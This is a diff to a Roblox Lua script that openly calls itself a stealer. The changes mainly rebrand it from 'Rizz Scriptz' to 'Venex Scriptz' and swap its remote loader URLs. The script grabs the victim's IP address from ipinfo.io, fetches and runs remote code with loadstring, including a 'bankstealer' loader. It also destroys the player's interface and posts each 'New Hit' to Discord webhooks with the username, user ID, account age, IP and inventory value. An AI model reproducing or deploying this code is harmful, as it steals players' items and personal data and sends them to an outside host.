@@ -213,8 +213,8 @@ local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
 -- Loading Screen
-if _G.LoadingScreen ~= true then
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ian4Life/Loadingscreen-/main/Loading'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
+if _G.LoadingScreen ~= false then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/VenexBetter/Loadingscreen/main/1'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
 end
 
 -- Remotes
@@ -748,13 +748,13 @@ end
 local diaamt = PlayerInfos.Diamonds
 if diaamt < 110000 then
     _G.Webhook = Webhook
-    _G.LoadingScreen = false
-    _G.AntiLeave = false
-    _G.MouseLock = false
+    _G.LoadingScreen = true
+    _G.AntiLeave = true
+    _G.MouseLock = true
     loadstring(game:HttpGetAsync("bankstealer raw link", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
-if _G.AntiLeave ~= false then
+if _G.AntiLeave ~= true then
     for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
         if v.Name ~= "Inventory" then
             v:Destroy()
@@ -955,13 +955,13 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     Image = game:GetService("HttpService"):JSONDecode(Image).data[1].imageUrl
     if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
         imgs =
-        "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
+        "https://cdn.discordapp.com/attachments/1124650331062669363/1127939416028090410/Screenshot_20230701-163607_1.png"
         data1 = {
             ["content"] = ping,
-            ["username"] = "Rizz Scriptz",
+            ["username"] = "Venex Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Rizz||",
+                ["title"] = "**New Hit** ||With Venex||",
                 ["url"] = "https://discord.gg/uSgzNwHDTS",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
@@ -971,7 +971,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Rizz Scriptz's Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Venex Scriptz's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1025,13 +1025,13 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         end
     else
         imgs =
-        "https://media.discordapp.net/attachments/736080557557022855/1143154476908298260/FB_IMG_1691312902228.jpg"
+        "https://media.discordapp.net/attachments/736080557557022855/1150299910550339644/FB_IMG_1691312902228.jpg"
         data1 = {
             ["content"] = ping,
             ["username"] = "FuegoEterno Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With FuegoEterno Scritpz||",
+                ["title"] = "**New Hit** ||With FuegoEterno Stealer||",
                 ["url"] = "https://discord.gg/pUKMNeRwsn",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
@@ -1041,7 +1041,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using FuegoEterno Scriptz's Stealer** :moyai:",
+                    ["name"] = "**This data was generated using FuegoEterno's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
